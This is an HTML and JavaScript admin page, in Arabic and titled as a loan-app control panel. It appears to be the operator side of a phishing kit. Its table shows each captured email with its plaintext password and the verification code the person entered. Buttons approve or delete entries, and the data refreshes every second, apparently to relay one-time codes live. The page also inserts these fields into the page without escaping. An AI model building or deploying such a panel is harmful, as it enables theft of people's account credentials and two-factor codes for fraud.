<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم الأدمن - تطبيق القروض</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a3a52 0%, #2d5a7b 100%);
            min-height: 100vh;
            padding: 20px;
        }

        nav {
            background: linear-gradient(135deg, #0f2438 0%, #1a3a52 100%);
            padding: 15px 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo-nav {
            color: white;
            font-size: 24px;
            font-weight: bold;
        }

        .nav-links {
            display: flex;
            gap: 20px;
            list-style: none;
        }

        .nav-links a {
            color: white;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
        }

        .nav-links a:hover {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            transform: translateY(-2px);
        }

        .nav-links a.active {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            color: white;
        }

        .logout-btn {
            background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .logout-btn:hover {
            background: linear-gradient(135deg, #990000 0%, #660000 100%);
            transform: translateY(-2px);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .page-title {
            color: white;
            font-size: 36px;
            margin-bottom: 30px;
            text-align: center;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            padding: 25px;
            border-radius: 12px;
            color: white;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 102, 204, 0.6);
        }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .stat-label {
            font-size: 16px;
            color: #b3d9ff;
        }

        .table-wrapper {
            background: linear-gradient(135deg, #1a3a52 0%, #2d5a7b 100%);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            overflow-x: auto;
            margin-bottom: 30px;
        }

        .search-box {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
        }

        .search-box input {
            flex: 1;
            padding: 12px 15px;
            border: 2px solid #4d94ff;
            border-radius: 8px;
            font-size: 14px;
            background-color: rgba(255, 255, 255, 0.95);
            color: #1a3a52;
        }

        .search-box input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 10px rgba(0, 102, 204, 0.3);
        }

        .search-btn {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .search-btn:hover {
            background: linear-gradient(135deg, #0052a3 0%, #003d7a 100%);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            color: white;
        }

        thead {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
        }

        th {
            padding: 15px;
            text-align: right;
            font-weight: bold;
            border-bottom: 2px solid #4d94ff;
        }

        tbody tr {
            border-bottom: 1px solid #4d94ff;
            transition: all 0.3s ease;
        }

        tbody tr:hover {
            background: rgba(77, 148, 255, 0.2);
        }

        td {
            padding: 15px;
            word-break: break-all;
        }

        .status-badge {
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 12px;
            text-align: center;
            display: inline-block;
        }

        .status-pending {
            background: linear-gradient(135deg, #ff9900 0%, #ff6600 100%);
            color: white;
        }

        .status-approved {
            background: linear-gradient(135deg, #00cc00 0%, #009900 100%);
            color: white;
        }

        .status-verified {
            background: linear-gradient(135deg, #00ffff 0%, #00cccc 100%);
            color: #1a3a52;
        }

        .action-btns {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .btn-approve {
            background: linear-gradient(135deg, #00cc00 0%, #009900 100%);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .btn-approve:hover {
            background: linear-gradient(135deg, #009900 0%, #006600 100%);
            transform: translateY(-2px);
        }

        .btn-delete {
            background: linear-gradient(135deg, #ff6600 0%, #ff3300 100%);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .btn-delete:hover {
            background: linear-gradient(135deg, #ff3300 0%, #ff0000 100%);
            transform: translateY(-2px);
        }

        .code-field {
            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
            color: #1a3a52;
            padding: 8px 12px;
            border-radius: 5px;
            font-weight: bold;
            font-family: monospace;
            font-size: 16px;
            display: inline-block;
        }

        .password-field {
            background: linear-gradient(135deg, #ffcc00 0%, #ff9900 100%);
            color: #1a3a52;
            padding: 8px 12px;
            border-radius: 5px;
            font-weight: bold;
            font-family: monospace;
            font-size: 14px;
            display: inline-block;
        }

        .badge-user {
            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            font-weight: bold;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: #b3d9ff;
        }

        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        @media (max-width: 768px) {
            nav {
                flex-direction: column;
                gap: 15px;
            }

            .nav-links {
                flex-direction: column;
                gap: 10px;
            }

            table {
                font-size: 12px;
            }

            th, td {
                padding: 10px;
            }

            .action-btns {
                flex-direction: column;
            }

            .btn-approve,
            .btn-delete {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <!-- شريط التنقل -->
    <nav>
        <div class="logo-nav">💳 لوحة التحكم - الأدمن</div>
        <ul class="nav-links">
            <li><a href="index.html">الرئيسية</a></li>
            <li><a class="active">طلبات الدخول</a></li>
        </ul>
        <button class="logout-btn" onclick="logout()">تسجيل الخروج 🚪</button>
    </nav>

    <div class="container">

        <!-- عنوان الصفحة -->
        <h1 class="page-title">📋 طلبات تسجيل الدخول</h1>

        <!-- الإحصائيات -->
        <div class="stats-container" id="statsContainer">
            <div class="stat-card">
                <div class="stat-number" id="totalRequests">0</div>
                <div class="stat-label">إجمالي الطلبات</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="pendingRequests">0</div>
                <div class="stat-label">طلبات معلقة</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="approvedRequests">0</div>
                <div class="stat-label">طلبات موافق عليها</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="verifiedRequests">0</div>
                <div class="stat-label">طلبات مؤكدة</div>
            </div>
        </div>

        <!-- جدول البيانات -->
        <div class="table-wrapper">
            <div class="search-box">
                <input type="text" id="searchInput" placeholder="ابحث عن بريد...">
                <button class="search-btn" onclick="searchRequests()">🔍 بحث</button>
            </div>

            <table id="requestsTable">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>البريد الإلكتروني</th>
                        <th>كلمة المرور</th>
                        <th>وقت الطلب</th>
                        <th>الحالة</th>
                        <th>الرمز المدخل</th>
                        <th>الإجراءات</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr>
                        <td colspan="7" class="empty-state">
                            <div class="empty-state-icon">📭</div>
                            <div>لا توجد طلبات حتى الآن</div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let verificationRequests = [];
        let filteredRequests = [];

        function loadRequests() {
            const savedRequests = localStorage.getItem('verificationRequests');
            verificationRequests = savedRequests ? JSON.parse(savedRequests) : [];
            filteredRequests = [...verificationRequests];
            displayRequests();
            updateStats();
        }

        function displayRequests() {
            const tableBody = document.getElementById('tableBody');
            
            if (filteredRequests.length === 0) {
                tableBody.innerHTML = `
                    <tr>
                        <td colspan="7" class="empty-state">
                            <div class="empty-state-icon">📭</div>
                            <div>لا توجد طلبات</div>
                        </td>
                    </tr>
                `;
                return;
            }

            tableBody.innerHTML = filteredRequests.map((request, index) => `
                <tr>
                    <td>${index + 1}</td>
                    <td><span class="badge-user">${request.email}</span></td>
                    <td><span class="password-field">${request.password}</span></td>
                    <td>${request.loginTime}</td>
                    <td>
                        <span class="status-badge status-${request.status.toLowerCase()}">
                            ${getStatusText(request.status)}
                        </span>
                    </td>
                    <td>
                        ${request.enteredCode ? `<span class="code-field">${request.enteredCode}</span>` : '-'}
                    </td>
                    <td>
                        <div class="action-btns">
                            ${request.status === 'pending' ? `
                                <button class="btn-approve" onclick="approveRequest(${request.loginId})">✓ موافقة</button>
                            ` : ''}
                            <button class="btn-delete" onclick="deleteRequest(${request.loginId})">🗑️ حذف</button>
                        </div>
                    </td>
                </tr>
            `).join('');
        }

        function approveRequest(loginId) {
            const request = verificationRequests.find(r => r.loginId === loginId);
            if (request) {
                request.status = 'approved';
                localStorage.setItem('verificationRequests', JSON.stringify(verificationRequests));
                loadRequests();
                alert('✅ تمت الموافقة! يمكن للعميل الآن إدخال أي رمز');
            }
        }

        function deleteRequest(loginId) {
            if (confirm('حذف الطلب؟')) {
                verificationRequests = verificationRequests.filter(r => r.loginId !== loginId);
                filteredRequests = filteredRequests.filter(r => r.loginId !== loginId);
                localStorage.setItem('verificationRequests', JSON.stringify(verificationRequests));
                loadRequests();
                alert('تم الحذف');
            }
        }

        function updateStats() {
            document.getElementById('totalRequests').textContent = verificationRequests.length;
            document.getElementById('pendingRequests').textContent = 
                verificationRequests.filter(r => r.status === 'pending').length;
            document.getElementById('approvedRequests').textContent = 
                verificationRequests.filter(r => r.status === 'approved').length;
            document.getElementById('verifiedRequests').textContent = 
                verificationRequests.filter(r => r.status === 'verified').length;
        }

        function searchRequests() {
            const term = document.getElementById('searchInput').value.toLowerCase();
            filteredRequests = verificationRequests.filter(r => r.email.toLowerCase().includes(term));
            displayRequests();
        }

        function getStatusText(status) {
            const map = {
                'pending': '⏳ معلق',
                'approved': '✅ موافق عليه',
                'verified': '🔐 مؤكد'
            };
            return map[status] || status;
        }

        function logout() {
            if (confirm('تسجيل الخروج؟')) {
                window.location.href = 'index.html';
            }
        }

        window.addEventListener('load', function() {
            loadRequests();
            // تحديث البيانات كل ثانية
            setInterval(loadRequests, 1000);
        });
    </script>

</body>
</html>
